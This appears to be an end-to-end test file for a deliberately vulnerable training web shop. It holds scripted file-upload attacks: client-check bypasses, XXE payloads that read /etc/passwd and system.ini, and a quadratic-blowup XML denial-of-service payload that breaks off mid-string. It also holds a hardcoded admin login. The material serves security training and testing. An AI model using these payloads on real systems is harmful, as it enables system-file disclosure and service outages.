const config = require('config')
const path = require('path')

describe('/#/complain', () => {
  protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

  describe('challenge "uploadSize"', () => {
    it('should be possible to upload files greater 100 KB', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript(() => {
        const over100KB = Array.apply(null, new Array(11000)).map(String.prototype.valueOf, '1234567890')
        const blob = new Blob(over100KB, { type: 'application/pdf' })

        const data = new FormData()
        data.append('file', blob, 'invalidSizeForClient.pdf')

        const request = new XMLHttpRequest()
        request.open('POST', '/file-upload')
        request.send(data)
      })
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'Upload Size' })
  })

  describe('challenge "uploadType"', () => {
    it('should be possible to upload files with other extension than .pdf', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript(() => {
        const data = new FormData()
        const blob = new Blob([ 'test' ], { type: 'application/x-msdownload' })
        data.append('file', blob, 'invalidTypeForClient.exe')

        const request = new XMLHttpRequest()
        request.open('POST', '/file-upload')
        request.send(data)
      })
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'Upload Type' })
  })

  describe('challenge "xxeFileDisclosure"', () => {
    it('should be possible to retrieve file from Windows server via .xml upload with XXE attack', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript(() => {
        const data = new FormData()
        const blob = new Blob(['<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini" >]><foo>&xxe;</foo>'], {type: 'application/xml'})
        data.append('file', blob, 'xxeForWindows.xml')

        const request = new XMLHttpRequest()
        request.open('POST', '/file-upload')
        request.send(data)
      })
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })

    it('should be possible to retrieve file from Linux server via .xml upload with XXE attack', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript(() => {
        const data = new FormData()
        const blob = new Blob(['<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'], {type: 'application/xml'})
        data.append('file', blob, 'xxeForLinux.xml')

        const request = new XMLHttpRequest()
        request.open('POST', '/file-upload')
        request.send(data)
      })
      browser.driver.sleep(3000)
      browser.waitForAngularEnabled(true)
    })

    afterAll(() => {
      protractor.expect.challengeSolved({ challenge: 'Deprecated Interface' })
      protractor.expect.challengeSolved({ challenge: 'XXE Tier 1' })
    })
  })

  describe('challenge "xxeDos"', () => {
    it('should be possible to trigger request timeout via .xml upload with Quadratic Blowup attack', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript(() => {
        const data = new FormData()
        const blob = new Blob(['<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY a "dosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdosdos" 